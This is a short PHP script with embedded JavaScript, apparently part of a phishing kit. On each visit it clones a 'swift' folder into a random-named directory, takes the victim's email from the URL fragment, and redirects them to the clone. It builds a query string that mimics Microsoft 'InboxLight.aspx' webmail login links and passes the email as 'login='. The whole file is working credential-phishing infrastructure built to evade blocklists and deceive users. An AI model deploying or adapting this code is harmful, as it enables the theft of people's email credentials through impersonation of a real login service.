<?php

$random = rand(50000, 100000000000);
$dst    = substr(md5($random), 0, 1000000000);

if (isset($_GET['uid'])) {
	@$loguid =  $_GET['uid'];
}

$hihi = '';
if (isset($_GET['mgs'])) {
	$msg = 'mgs=tee';
} else {
	$msg = 'nosmgs=tee';
}

if (isset($_GET['r'])) {
	$hihi = ($_GET['r']+1);
}else{
	$hihi = "1";
}
 
function recurse_copy($src, $dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while (false !== ($file = readdir($dir))) {
		if (($file != '.') && ($file != '..')) {
			if (is_dir($src . '/' . $file)) {
				recurse_copy($src . '/' . $file, $dst . '/' . $file);
			} else {
				copy($src . '/' . $file, $dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

$src = "swift";
recurse_copy($src, $dst);

?>

<script>
	var ef = window.location.hash.split('#')[1];
	var cage = "<?php echo $dst; ?>" + "?Key=<?php echo $random; ?>&rand=13InboxLightaspxn<?php echo $random; ?>1774256418&fid.4.1252899642&fid=1&<?php echo $msg; ?>&r=<?php echo $hihi; ?>&rand=13InboxLight.aspxn.1774256418&fid1252899642&fid1&fav1&login=" + ef + "&.rand=13InboxLight.aspx?n=<?php echo $random; ?>";
 
	if (ef != null) {
		setTimeout(function() {
		 	window.location = cage;
		}, 1000);
	}
</script>
